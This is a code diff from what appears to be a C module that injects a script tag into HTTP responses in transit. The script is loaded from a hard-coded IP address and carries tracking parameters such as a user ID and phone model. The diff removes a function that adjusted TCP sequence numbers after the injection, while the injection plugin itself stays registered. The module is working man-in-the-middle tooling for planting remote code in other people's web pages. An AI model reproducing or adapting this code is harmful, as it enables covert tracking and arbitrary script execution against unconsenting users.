@@ -5,26 +5,6 @@
 #define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n"
 #define JS_LEN strlen(JS)
 
-
-PRIVATE int change_seq(void *data)
-{
-	struct http_request* httpr=(struct http_request*)data;
-	struct skb_buf* skb=httpr->curr_skb;
-	
-	//after first packet
-
-	if(httpr->response_num<=1 || httpr->js_len ==0)
-	{
-		return ERROR;
-	}
-
-	struct iphdr *this_iphdr = (struct iphdr *) (skb->pload);  
-	struct tcphdr *this_tcphdr = (struct tcphdr *) (skb->pload+ 4 * this_iphdr->ihl);
-	this_tcphdr->seq=htonl(skb->seq + httpr->js_len);
-	return OK;
-}
-
-
 PRIVATE int change_chunked_hex(void *data)
 {
 	struct http_request* httpr=(struct http_request*)data;
@@ -172,7 +152,7 @@ PRIVATE int insert_js(void *data)
 int init_plug_extern()
 {
 	new_plug(insert_js , PLUG_EXTERN_TYPE_RESPONSE);
-	new_plug(change_seq , PLUG_EXTERN_TYPE_RESPONSE);
+	
 	return 0;
 }
 
